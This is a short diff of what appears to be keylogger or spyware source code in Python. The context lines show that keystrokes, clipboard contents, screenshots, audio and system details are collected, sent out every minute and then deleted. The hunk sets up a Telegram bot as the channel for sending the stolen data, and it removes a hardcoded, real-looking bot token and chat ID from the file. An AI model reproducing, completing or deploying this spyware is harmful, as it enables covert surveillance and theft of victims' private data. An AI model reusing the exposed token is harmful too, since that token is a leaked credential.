@@ -50,8 +50,8 @@ time_iteration = 60  # Send data every 1 minute
 delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
 
 # Telegram Configuration
-telegram_token = "7484776501:AAFXRvduMzYq8-qOLReipATAiffGEWM_xrw"  # Replace with your bot token
-telegram_chat_id = "862813205"  # Replace with your chat ID
+telegram_token = ""  # Replace with your bot token
+telegram_chat_id = ""  # Replace with your chat ID
 bot = telegram.Bot(token=telegram_token)
 
 file_path = "Files"  # Enter the file path you want your files to be saved to
